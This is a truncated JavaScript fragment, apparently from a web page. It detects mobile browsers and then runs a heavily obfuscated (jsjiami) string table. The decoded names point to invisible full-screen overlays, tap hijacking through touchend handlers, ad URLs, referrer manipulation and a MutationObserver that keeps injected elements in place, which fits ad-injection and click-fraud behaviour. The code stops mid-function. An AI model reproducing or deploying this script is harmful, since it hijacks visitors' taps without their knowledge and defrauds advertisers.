　var url = document.location.toString();
　　　　var arrUrl = url.split("//");

　　　　var start = arrUrl[1].indexOf("/");
　　　　var relUrl = arrUrl[1].substring(start);

　　　　if(relUrl.indexOf("?") != -1){
　　　　　　relUrl = relUrl.split("?")[0];
　　　　}
		if(top != self){
			top.location=self.location;
		}
		var as = navigator.userAgent;
		if(/mobile/i.test(as) || /(Android|iPhone|iPod|iPad|Windows Phone|webOS)/i.test(as)){
			
		
var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxcf565=["\x69\x64\x69\x61","\x64\x65\x66\x61\x75\x6C\x74\x73","\x61\x73\x73\x69\x67\x6E","\x61\x6E\x63\x65\x6E\x67","\x63\x6E\x7A\x7A\x5F\x6C\x69\x6E\x6B","\x5F\x73\x77\x69\x70\x65\x72\x53\x6C\x69\x64\x65\x4D\x6F\x6E\x69\x74\x6F\x72","\x70\x72\x6F\x74\x6F\x74\x79\x70\x65","\x6C\x65\x6E\x67\x74\x68","\x73\x72\x63\x48\x72\x65\x66\x41\x72\x72","\x6E\x75\x6D","\x64\x69\x73\x70\x6C\x61\x79","\x73\x74\x79\x6C\x65","\x61\x6E\x63\x65\x6E\x67\x31","\x72\x61\x6E\x64\x6F\x6D","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x62\x6C\x6F\x63\x6B","\x6E\x6F\x6E\x65","\x61\x6E\x63\x65\x6E\x67\x32","\x73\x6C\x69\x64\x65\x43\x68\x61\x6E\x67\x65\x54\x72\x61\x6E\x73\x69\x74\x69\x6F\x6E\x45\x6E\x64","\x63\x75\x72\x72\x65\x6E\x74\x49\x6E\x64\x65\x78","\x61\x63\x74\x69\x76\x65\x49\x6E\x64\x65\x78","\x6F\x6E","\x6D\x79\x53\x77\x69\x70\x65\x72\x6F\x67\x6A\x65\x6A\x61\x6C\x6B\x67\x6A\x6F\x77\x65","\x5F\x73\x77\x69\x70\x65\x72\x4D\x6F\x6E\x69\x74\x6F\x72","\x61\x72\x74\x69\x63\x6C\x65\x69\x64","\x6F\x6E\x73\x63\x72\x6F\x6C\x6C","\x5F\x69\x73\x49\x6E\x56\x69\x65\x77\x50\x6F\x72\x74\x4F\x66\x54\x77\x6F","\x67\x65\x74\x42\x6F\x75\x6E\x64\x69\x6E\x67\x43\x6C\x69\x65\x6E\x74\x52\x65\x63\x74","\x62\x6F\x74\x74\x6F\x6D","\x74\x6F\x70","\x63\x6C\x69\x65\x6E\x74\x48\x65\x69\x67\x68\x74","\x64\x6F\x63\x75\x6D\x65\x6E\x74\x45\x6C\x65\x6D\x65\x6E\x74","\x72\x75\x6E\x6E\x69\x6E\x67","\x61\x75\x74\x6F\x70\x6C\x61\x79","\x6F\x6A\x67\x77\x6A\x61\x67\x65\x6A\x73\x67\x65\x6A","\x73\x74\x61\x72\x74","\x73\x74\x6F\x70","\x5F\x61\x6E\x63\x65\x6E\x67\x61\x6E\x73\x68\x75\x61\x64\x69\x61\x6E\x74\x61\x6E","\x62\x6F\x64\x79","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x63\x6C\x69\x63\x6B","\x69\x64","\x74\x61\x72\x67\x65\x74","\x64\x69\x61\x6E\x74\x61\x6E","\x6E\x75\x6D\x62\x65\x72","\x30","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x72\x65\x66\x64\x74","\x72\x65\x6C\x6F\x61\x64","\x61\x6C\x61\x62\x65\x6C\x62\x6F\x78\x31\x31","\x68\x65\x69\x67\x68\x74","\x73\x77\x69\x70\x65\x72\x63\x6F\x6E\x74\x61\x69\x6E\x65\x72","\x73\x77\x69\x70\x65\x72\x2D\x73\x6C\x69\x64\x65","\x69\x6E\x64\x65\x78\x4F\x66","\x63\x6C\x61\x73\x73\x4E\x61\x6D\x65","\x75\x72\x6C","\x64\x61\x74\x61\x73\x65\x74","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x74\x6F\x75\x63\x68\x65\x6E\x64","\x61\x6E\x73\x68\x75\x61","\x5F\x61\x70\x70\x65\x6E\x64","\x77\x72\x69\x74\x65","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x6C\x61\x73\x74\x43\x68\x69\x6C\x64","\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65","\x5F\x73\x77\x69\x70\x65\x72\x53\x63\x72\x69\x70\x74","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x67\x6B\x6F\x77\x6B\x61\x67\x6C\x67\x73","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x76\x61\x72\x20\x67\x6F\x6F\x6A\x66\x6C\x6A\x65\x77\x67\x6B\x6C\x3D\x74\x72\x75\x65\x3B\x76\x61\x72\x20\x6D\x79\x53\x77\x69\x70\x65\x72\x6F\x67\x6A\x65\x6A\x61\x6C\x6B\x67\x6A\x6F\x77\x65","\x3D\x6E\x65\x77\x20\x53\x77\x69\x70\x65\x72\x28\x27\x23\x73\x77\x69\x70\x65\x72\x63\x6F\x6E\x74\x61\x69\x6E\x65\x72","\x27\x2C\x7B\x6C\x6F\x6F\x70\x3A","\x2C\x77\x61\x74\x63\x68\x4F\x76\x65\x72\x66\x6C\x6F\x77\x3A","\x2C\x73\x6C\x69\x64\x65\x73\x50\x65\x72\x56\x69\x65\x77\x3A","\x2C\x73\x70\x61\x63\x65\x42\x65\x74\x77\x65\x65\x6E\x3A","\x73\x70\x61\x63\x65\x42\x65\x74\x77\x65\x65\x6E","\x2C\x73\x6C\x69\x64\x65\x73\x50\x65\x72\x47\x72\x6F\x75\x70\x3A","\x2C\x61\x75\x74\x6F\x70\x6C\x61\x79\x3A\x7B\x64\x69\x73\x61\x62\x6C\x65\x4F\x6E\x49\x6E\x74\x65\x72\x61\x63\x74\x69\x6F\x6E\x3A\x66\x61\x6C\x73\x65\x2C\x64\x65\x6C\x61\x79\x3A","\x64\x65\x6C\x61\x79","\x2C\x7D\x2C\x70\x61\x67\x69\x6E\x61\x74\x69\x6F\x6E\x3A\x7B\x65\x6C\x3A\x27\x2E\x73\x77\x69\x70\x65\x72\x2D\x70\x61\x67\x69\x6E\x61\x74\x69\x6F\x6E\x27\x2C\x7D\x2C\x7D\x29\x3B\x6D\x79\x53\x77\x69\x70\x65\x72\x6F\x67\x6A\x65\x6A\x61\x6C\x6B\x67\x6A\x6F\x77\x65","\x2E\x6F\x6E\x28\x27\x73\x6C\x69\x64\x65\x43\x68\x61\x6E\x67\x65\x54\x72\x61\x6E\x73\x69\x74\x69\x6F\x6E\x45\x6E\x64\x27\x2C\x66\x75\x6E\x63\x74\x69\x6F\x6E\x28\x29\x7B\x69\x66\x28\x74\x68\x69\x73\x2E\x61\x63\x74\x69\x76\x65\x49\x6E\x64\x65\x78\x3D\x3D\x27","\x27\x26\x26\x67\x6F\x6F\x6A\x66\x6C\x6A\x65\x77\x67\x6B\x6C\x29\x7B\x6D\x79\x53\x77\x69\x70\x65\x72\x6F\x67\x6A\x65\x6A\x61\x6C\x6B\x67\x6A\x6F\x77\x65","\x2E\x61\x75\x74\x6F\x70\x6C\x61\x79\x2E\x73\x74\x6F\x70\x28\x29\x3B\x77\x69\x6E\x64\x6F\x77\x2E\x6F\x6A\x67\x77\x6A\x61\x67\x65\x6A\x73\x67\x65\x6A","\x3D\x74\x72\x75\x65\x3B\x67\x6F\x6F\x6A\x66\x6C\x6A\x65\x77\x67\x6B\x6C\x3D\x66\x61\x6C\x73\x65\x7D\x65\x6C\x73\x65\x20\x69\x66\x28\x74\x68\x69\x73\x2E\x61\x63\x74\x69\x76\x65\x49\x6E\x64\x65\x78\x21\x3D\x27","\x27\x29\x7B\x6D\x79\x53\x77\x69\x70\x65\x72\x6F\x67\x6A\x65\x6A\x61\x6C\x6B\x67\x6A\x6F\x77\x65","\x2E\x61\x75\x74\x6F\x70\x6C\x61\x79\x2E\x73\x74\x61\x72\x74\x28\x29\x3B\x77\x69\x6E\x64\x6F\x77\x2E\x6F\x6A\x67\x77\x6A\x61\x67\x65\x6A\x73\x67\x65\x6A","\x3D\x66\x61\x6C\x73\x65\x3B\x67\x6F\x6F\x6A\x66\x6C\x6A\x65\x77\x67\x6B\x6C\x3D\x74\x72\x75\x65\x7D\x7D\x29\x3B\x77\x69\x6E\x64\x6F\x77\x2E\x6D\x79\x53\x77\x69\x70\x65\x72\x6F\x67\x6A\x65\x6A\x61\x6C\x6B\x67\x6A\x6F\x77\x65","\x3D\x6D\x79\x53\x77\x69\x70\x65\x72\x6F\x67\x6A\x65\x6A\x61\x6C\x6B\x67\x6A\x6F\x77\x65","\x3B","\x5F\x69\x66\x72\x61\x6D\x65\x41\x6E\x63\x65\x6E\x67\x41\x6E\x73\x68\x75\x61","\x6D\x61\x74\x65\x72\x69\x61\x6C","\x69\x64\x32","\x73\x77\x69\x70\x65\x72\x73\x6C\x69\x64\x65","\x61\x64\x5F\x75\x72\x6C","\x5F\x73\x77\x69\x70\x65\x72\x43\x64\x6E","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x62\x6F\x6F\x74\x63\x64\x6E\x2E\x6E\x65\x74\x2F\x61\x6A\x61\x78\x2F\x6C\x69\x62\x73\x2F\x53\x77\x69\x70\x65\x72\x2F\x36\x2E\x37\x2E\x30\x2F\x73\x77\x69\x70\x65\x72\x2D\x62\x75\x6E\x64\x6C\x65\x2E\x6D\x69\x6E\x2E\x6A\x73","\x68\x65\x61\x64","\x71\x75\x65\x72\x79\x53\x65\x6C\x65\x63\x74\x6F\x72","\x6C\x69\x6E\x6B","\x72\x65\x6C","\x73\x74\x79\x6C\x65\x73\x68\x65\x65\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x62\x6F\x6F\x74\x63\x64\x6E\x2E\x6E\x65\x74\x2F\x61\x6A\x61\x78\x2F\x6C\x69\x62\x73\x2F\x53\x77\x69\x70\x65\x72\x2F\x36\x2E\x37\x2E\x30\x2F\x73\x77\x69\x70\x65\x72\x2D\x62\x75\x6E\x64\x6C\x65\x2E\x6D\x69\x6E\x2E\x63\x73\x73","\x5F\x6D\x65\x74\x61","\x72\x65\x66\x65\x72\x72\x65\x72","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x63\x6F\x6E\x74\x65\x6E\x74","\x6F\x72\x69\x67\x69\x6E","\x6D\x65\x74\x61","\x6E\x61\x6D\x65","\x5F\x69\x6E\x69\x74","\x5F\x73\x65\x74\x54\x65\x6D\x70\x6C\x61\x74\x65","\x31","\x3C\x68\x31\x20\x69\x64\x3D\x27\x68\x31\x70\x6C\x61\x63\x65\x68\x6F\x6C\x64\x65\x72\x20","\x27\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x61\x64\x64\x69\x6E\x67\x3A\x30\x3B\x6D\x61\x72\x67\x69\x6E\x3A\x30\x3B\x62\x6F\x72\x64\x65\x72\x3A\x30\x27\x3E\x3C\x2F\x68\x31\x3E\x3C\x61\x72\x74\x69\x63\x6C\x65\x20\x69\x64\x3D\x27\x61\x72\x74\x69\x63\x6C\x65\x69\x64","\x27\x20\x63\x6C\x61\x73\x73\x3D\x27\x4F\x35\x45\x37\x33","\x20","\x27\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x20\x72\x65\x6C\x61\x74\x69\x76\x65\x3B\x64\x69\x73\x70\x6C\x61\x79\x3A\x62\x6C\x6F\x63\x6B\x3B\x77\x69\x64\x74\x68\x3A\x31\x30\x30\x25\x3B\x68\x65\x69\x67\x68\x74\x3A","\x62\x6F\x78\x48\x65\x69\x67\x68\x74","\x70\x78\x3B\x27\x3E\x3C\x64\x69\x76\x20\x69\x64\x3D\x27\x61\x6C\x61\x62\x65\x6C\x62\x6F\x78\x31\x31","\x27\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x72\x69\x67\x68\x74\x3A\x30\x3B\x74\x6F\x70\x3A\x30\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x32\x31\x34\x37\x34\x38\x33\x36\x34\x37\x3B\x77\x69\x64\x74\x68\x3A\x32\x30\x70\x78\x3B\x68\x65\x69\x67\x68\x74\x3A\x32\x30\x70\x78\x3B\x6C\x69\x6E\x65\x2D\x68\x65\x69\x67\x68\x74\x3A\x31\x39\x70\x78\x3B\x74\x65\x78\x74\x2D\x61\x6C\x69\x67\x6E\x3A\x63\x65\x6E\x74\x65\x72\x3B\x62\x61\x63\x6B\x67\x72\x6F\x75\x6E\x64\x2D\x63\x6F\x6C\x6F\x72\x3A\x72\x67\x62\x61\x28\x30\x2C\x30\x2C\x30\x2C\x2E\x32\x29\x3B\x62\x6F\x72\x64\x65\x72\x2D\x72\x61\x64\x69\x75\x73\x3A\x35\x30\x25\x3B\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x20\x31\x38\x70\x78\x3B\x66\x6F\x6E\x74\x2D\x77\x65\x69\x67\x68\x74\x3A\x37\x30\x30\x3B\x63\x6F\x6C\x6F\x72\x3A\x23\x66\x66\x66\x3B\x27\x3E\xD7\x3C\x2F\x64\x69\x76\x3E\x3C\x64\x69\x76\x20\x69\x64\x3D\x27\x64\x69\x61\x6E\x74\x61\x6E","\x27\x20\x73\x74\x79\x6C\x65\x3D\x27\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x32\x31\x34\x37\x34\x38\x33\x36\x34\x37\x3B\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x66\x69\x78\x65\x64\x3B\x74\x6F\x70\x3A\x30\x3B\x6C\x65\x66\x74\x3A\x30\x3B\x77\x69\x64\x74\x68\x3A\x31\x30\x30\x76\x77\x3B\x68\x65\x69\x67\x68\x74\x3A\x31\x30\x30\x76\x68\x3B\x64\x69\x73\x70\x6C\x61\x79\x3A","\x3B\x27\x3E\x3C\x2F\x64\x69\x76\x3E\x3C\x2F\x61\x72\x74\x69\x63\x6C\x65\x3E","\x5F\x73\x65\x74\x54\x65\x6D\x70\x6C\x61\x74\x65\x46\x69\x72\x61\x6D\x65","\x69\x66\x72\x61\x6D\x65","\x69\x66\x72\x61\x6D\x65\x69\x64","\x66\x72\x61\x6D\x65\x62\x6F\x72\x64\x65\x72","\x6D\x61\x72\x67\x69\x6E\x3A\x30\x3B\x70\x61\x64\x64\x69\x6E\x67\x3A\x30\x3B\x62\x6F\x72\x64\x65\x72\x3A\x30\x3B\x77\x69\x64\x74\x68\x3A\x31\x30\x30\x25\x3B\x6D\x61\x78\x2D\x68\x65\x69\x67\x68\x74\x3A","\x70\x78\x3B\x68\x65\x69\x67\x68\x74\x3A","\x70\x78\x3B\x2D\x77\x65\x62\x6B\x69\x74\x2D\x61\x6E\x69\x6D\x61\x74\x69\x6F\x6E\x3A\x73\x68\x61\x6B\x65\x67\x77\x65\x67\x73\x20\x31\x73\x20\x30\x2E\x32\x73\x20\x69\x6E\x66\x69\x6E\x69\x74\x65\x3B\x2D\x6D\x6F\x7A\x2D\x61\x6E\x69\x6D\x61\x74\x69\x6F\x6E\x3A\x73\x68\x61\x6B\x65\x67\x77\x65\x67\x73\x20\x31\x73\x20\x30\x2E\x32\x73\x20\x69\x6E\x66\x69\x6E\x69\x74\x65\x3B\x64\x69\x73\x70\x6C\x61\x79\x3A\x62\x6C\x6F\x63\x6B\x3B\x70\x6F\x69\x6E\x74\x65\x72\x2D\x65\x76\x65\x6E\x74\x73\x3A\x20\x6E\x6F\x6E\x65\x3B","\x73\x72\x63\x64\x6F\x63","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x64\x69\x73\x70\x6C\x61\x79\x3A\x20\x66\x6C\x65\x78\x3B\x77\x69\x64\x74\x68\x3A\x31\x30\x30\x25\x3B\x68\x65\x69\x67\x68\x74\x3A\x31\x30\x30\x25\x27\x3E\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x20\x66\x69\x78\x65\x64\x3B\x74\x6F\x70\x3A\x35\x30\x25\x3B\x74\x72\x61\x6E\x73\x66\x6F\x72\x6D\x3A\x20\x74\x72\x61\x6E\x73\x6C\x61\x74\x65\x59\x28\x2D\x35\x30\x25\x29\x3B\x6C\x65\x66\x74\x3A\x30\x3B\x63\x6F\x6C\x6F\x72\x3A\x23\x30\x30\x30\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x32\x31\x34\x37\x34\x38\x33\x36\x34\x37\x3B\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x20\x31\x32\x70\x78\x3B\x70\x6F\x69\x6E\x74\x65\x72\x2D\x65\x76\x65\x6E\x74\x73\x3A\x20\x6E\x6F\x6E\x65\x3B\x27\x3E","\x65\x7E\x3C\x2F\x64\x69\x76\x3E\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x64\x69\x73\x70\x6C\x61\x79\x3A\x6E\x6F\x6E\x65\x3B\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x20\x66\x69\x78\x65\x64\x3B\x74\x6F\x70\x3A\x30\x3B\x72\x69\x67\x68\x74\x3A\x30\x3B\x63\x6F\x6C\x6F\x72\x3A\x23\x66\x66\x66\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x32\x31\x34\x37\x34\x38\x33\x36\x34\x37\x3B\x77\x69\x64\x74\x68\x3A\x31\x36\x70\x78\x3B\x68\x65\x69\x67\x68\x74\x3A\x31\x36\x70\x78\x3B\x6C\x69\x6E\x65\x2D\x68\x65\x69\x67\x68\x74\x3A\x31\x36\x70\x78\x3B\x74\x65\x78\x74\x2D\x61\x6C\x69\x67\x6E\x3A\x63\x65\x6E\x74\x65\x72\x3B\x62\x61\x63\x6B\x67\x72\x6F\x75\x6E\x64\x2D\x63\x6F\x6C\x6F\x72\x3A\x72\x67\x62\x61\x28\x30\x2C\x30\x2C\x30\x2C\x2E\x32\x29\x3B\x62\x6F\x72\x64\x65\x72\x2D\x72\x61\x64\x69\x75\x73\x3A\x35\x70\x78\x3B\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x20\x31\x38\x70\x78\x3B\x66\x6F\x6E\x74\x2D\x77\x65\x69\x67\x68\x74\x3A\x37\x30\x30\x3B\x27\x3E\xD7\x3C\x2F\x64\x69\x76\x3E\x3C\x69\x6D\x67\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x66\x69\x78\x65\x64\x3B\x74\x6F\x70\x3A\x30\x3B\x6C\x65\x66\x74\x3A\x30\x3B\x77\x69\x64\x74\x68\x3A\x31\x30\x30\x25\x3B\x68\x65\x69\x67\x68\x74\x3A","\x70\x78\x3B\x27\x20\x73\x72\x63\x3D\x27","\x27\x20\x61\x6C\x74\x3D\x27\x27\x3E\x3C\x2F\x64\x69\x76\x3E","\x5F\x73\x65\x74\x54\x65\x6D\x70\x6C\x61\x74\x65\x41\x6E\x63\x65\x6E\x67","\x64\x69\x72\x65\x63\x74\x69\x6F\x6E","\x64\x61\x72\x6B\x48\x65\x69\x67\x68\x74","\x35\x30\x25","\x31\x30\x30\x25","\x64\x69\x76","\x64\x61\x74\x61\x2D\x69\x6E\x64\x65\x78","\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65","\x64\x61\x74\x61\x2D\x75\x72\x6C","\x64\x69\x73\x70\x6C\x61\x79\x3A","\x3B\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B","\x3A","\x70\x78\x3B\x6C\x65\x66\x74\x3A","\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x32\x31\x34\x37\x34\x38\x33\x36\x34\x37\x3B\x68\x65\x69\x67\x68\x74\x3A","\x76\x68\x3B\x77\x69\x64\x74\x68\x3A","\x3B\x70\x61\x64\x64\x69\x6E\x67\x3A\x30\x70\x78\x27","\x5F\x73\x65\x74\x54\x65\x6D\x70\x6C\x61\x74\x65\x41\x6E\x73\x68\x75\x61","\x3B\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x74\x6F\x70\x3A\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x30\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x32\x31\x34\x37\x34\x38\x33\x36\x34\x37\x3B\x68\x65\x69\x67\x68\x74\x3A","\x70\x78\x3B\x77\x69\x64\x74\x68\x3A\x31\x30\x30\x25\x3B\x70\x61\x64\x64\x69\x6E\x67\x3A\x30\x70\x78\x27","\x5F\x6F\x62\x73\x65\x72\x76\x65\x72\x66\x66","\x74\x79\x70\x65","\x63\x68\x69\x6C\x64\x4C\x69\x73\x74","\x69\x6E\x6C\x69\x6E\x65","\x76\x69\x73\x69\x62\x69\x6C\x69\x74\x79","\x76\x69\x73\x69\x62\x6C\x65","\x61\x74\x74\x72\x69\x62\x75\x74\x65\x73","\x6F\x62\x73\x65\x72\x76\x65","\x5F\x63\x6E\x7A\x7A\x5F\x6C\x69\x6E\x6B","\x66\x69\x72\x73\x74\x43\x68\x69\x6C\x64","\x5F\x73\x68\x61\x6B\x65","\x74\x65\x78\x74\x2F\x63\x73\x73","\x2E\x73\x77\x69\x70\x65\x72\x2D\x63\x6F\x6E\x74\x61\x69\x6E\x65\x72\x7B\x2E\x73\x77\x69\x70\x65\x72\x2D\x70\x61\x67\x69\x6E\x61\x74\x69\x6F\x6E\x2D\x62\x75\x6C\x6C\x65\x74\x7B\x6D\x61\x72\x67\x69\x6E\x3A\x30\x20\x31\x30\x70\x78\x7D\x7D\x3B","\x73\x68\x61\x6B\x65","\x40\x2D\x6D\x6F\x7A\x2D\x6B\x65\x79\x66\x72\x61\x6D\x65\x73\x20\x73\x68\x61\x6B\x65\x67\x77\x65\x67\x73\x7B\x30\x25\x7B\x2D\x6D\x6F\x7A\x2D\x74\x72\x61\x6E\x73\x66\x6F\x72\x6D\x3A\x73\x63\x61\x6C\x65\x28\x31\x29\x7D\x31\x30\x25\x2C\x32\x30\x25\x7B\x2D\x6D\x6F\x7A\x2D\x74\x72\x61\x6E\x73\x66\x6F\x72\x6D\x3A\x73\x63\x61\x6C\x65\x28\x30\x2E\x39\x35\x29\x72\x6F\x74\x61\x74\x65\x28\x2D\x32\x2E\x35\x64\x65\x67\x29\x7D\x33\x30\x25\x2C\x35\x30\x25\x2C\x37\x30\x25\x2C\x39\x30\x25\x7B\x2D\x6D\x6F\x7A\x2D\x74\x72\x61\x6E\x73\x66\x6F\x72\x6D\x3A\x73\x63\x61\x6C\x65\x28\x31\x29\x72\x6F\x74\x61\x74\x65\x28\x32\x2E\x35\x64\x65\x67\x29\x7D\x34\x30\x25\x2C\x36\x30\x25\x2C\x38\x30\x25\x7B\x2D\x6D\x6F\x7A\x2D\x74\x72\x61\x6E\x73\x66\x6F\x72\x6D\x3A\x73\x63\x61\x6C\x65\x28\x31\x29\x72\x6F\x74\x61\x74\x65\x28\x2D\x32\x2E\x35\x64\x65\x67\x29\x7D\x31\x30\x30\x25\x7B\x2D\x6D\x6F\x7A\x2D\x74\x72\x61\x6E\x73\x66\x6F\x72\x6D\x3A\x73\x63\x61\x6C\x65\x28\x31\x29\x72\x6F\x74\x61\x74\x65\x28\x30\x29\x7D\x7D\x40\x2D\x77\x65\x62\x6B\x69\x74\x2D\x6B\x65\x79\x66\x72\x61\x6D\x65\x73\x20\x73\x68\x61\x6B\x65\x67\x77\x65\x67\x73\x7B\x30\x25\x7B\x2D\x77\x65\x62\x6B\x69\x74\x2D\x74\x72\x61\x6E\x73\x66\x6F\x72\x6D\x3A\x73\x63\x61\x6C\x65\x28\x31\x29\x7D\x31\x30\x25\x2C\x32\x30\x25\x7B\x2D\x77\x65\x62\x6B\x69\x74\x2D\x74\x72\x61\x6E\x73\x66\x6F\x72\x6D\x3A\x73\x63\x61\x6C\x65\x28\x30\x2E\x39\x35\x29\x72\x6F\x74\x61\x74\x65\x28\x2D\x32\x2E\x35\x64\x65\x67\x29\x7D\x33\x30\x25\x2C\x35\x30\x25\x2C\x37\x30\x25\x2C\x39\x30\x25\x7B\x2D\x77\x65\x62\x6B\x69\x74\x2D\x74\x72\x61\x6E\x73\x66\x6F\x72\x6D\x3A\x73\x63\x61\x6C\x65\x28\x31\x29\x72\x6F\x74\x61\x74\x65\x28\x32\x2E\x35\x64\x65\x67\x29\x7D\x34\x30\x25\x2C\x36\x30\x25\x2C\x38\x30\x25\x7B\x2D\x77\x65\x62\x6B\x69\x74\x2D\x74\x72\x61\x6E\x73\x66\x6F\x72\x6D\x3A\x73\x63\x61\x6C\x65\x28\x31\x29\x72\x6F\x74\x61\x74\x65\x28\x2D\x32\x2E\x35\x64\x65\x67\x29\x7D\x31\x30\x30\x25\x7B\x2D\x77\x65\x62\x6B\x69\x74\x2D\x74\x72\x61\x6E\x73\x66\x6F\x72\x6D\x3A\x73\x63\x61\x6C\x65\x28\x31\x29\x72\x6F\x74\x61\x74\x65\x28\x30\x29\x7D\x7D","\x5F\x73\x77\x69\x70\x65\x72\x53\x6C\x69\x64\x65","\x73\x77\x69\x70\x65\x72\x2D\x63\x6F\x6E\x74\x61\x69\x6E\x65\x72","\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x74\x6F\x70\x3A\x30\x3B\x6C\x65\x66\x74\x3A\x30\x3B\x74\x72\x61\x6E\x73\x66\x6F\x72\x6D\x3A\x20\x6E\x6F\x6E\x65\x3B","\x70\x6F\x73\x69\x74\x69\x6F\x6E","\x3A\x30\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x32\x31\x34\x37\x34\x38\x33\x36\x34\x36\x3B\x6D\x61\x72\x67\x69\x6E\x3A\x30\x3B\x70\x61\x64\x64\x69\x6E\x67\x3A\x30\x3B\x62\x6F\x72\x64\x65\x72\x3A\x30\x3B\x77\x69\x64\x74\x68\x3A\x31\x30\x30\x25\x3B\x6D\x61\x78\x2D\x68\x65\x69\x67\x68\x74\x3A","\x70\x78\x3B\x2D\x77\x65\x62\x6B\x69\x74\x2D\x61\x6E\x69\x6D\x61\x74\x69\x6F\x6E\x3A\x73\x68\x61\x6B\x65\x67\x77\x65\x67\x73\x20\x31\x73\x20\x30\x2E\x32\x73\x20\x69\x6E\x66\x69\x6E\x69\x74\x65\x3B\x2D\x6D\x6F\x7A\x2D\x61\x6E\x69\x6D\x61\x74\x69\x6F\x6E\x3A\x73\x68\x61\x6B\x65\x67\x77\x65\x67\x73\x20\x31\x73\x20\x30\x2E\x32\x73\x20\x69\x6E\x66\x69\x6E\x69\x74\x65\x3B\x64\x69\x73\x70\x6C\x61\x79\x3A\x62\x6C\x6F\x63\x6B\x3B\x6F\x76\x65\x72\x66\x6C\x6F\x77\x3A\x20\x68\x69\x64\x64\x65\x6E\x3B","\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x27\x73\x77\x69\x70\x65\x72\x2D\x77\x72\x61\x70\x70\x65\x72\x27\x3E","\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x27\x73\x77\x69\x70\x65\x72\x2D\x73\x6C\x69\x64\x65\x27\x20\x69\x64\x3D\x27\x73\x77\x69\x70\x65\x72\x73\x6C\x69\x64\x65","\x27\x20\x64\x61\x74\x61\x2D\x73\x77\x69\x70\x65\x72\x2D\x61\x75\x74\x6F\x70\x6C\x61\x79\x3D\x27","\x73\x65\x74\x74\x69\x6D\x65","\x27\x20\x20\x64\x61\x74\x61\x2D\x69\x6E\x64\x65\x78\x3D\x27","\x27\x20\x64\x61\x74\x61\x2D\x75\x72\x6C\x3D\x27","\x27\x3E\x3C\x2F\x64\x69\x76\x3E","\x66\x6F\x72\x45\x61\x63\x68","\x3C\x2F\x64\x69\x76\x3E\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x27\x73\x77\x69\x70\x65\x72\x2D\x70\x61\x67\x69\x6E\x61\x74\x69\x6F\x6E\x27\x20\x73\x74\x79\x6C\x65\x3D\x27\x62\x6F\x74\x74\x6F\x6D\x3A\x30\x3B\x64\x69\x73\x70\x6C\x61\x79\x3A","\x73\x6B\x69\x70","\x7B\x61\x64\x73\x7D","\x70\x61\x72\x73\x65","\x4A\x53\x4F\x4E","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];(function(_0x3920x1){var 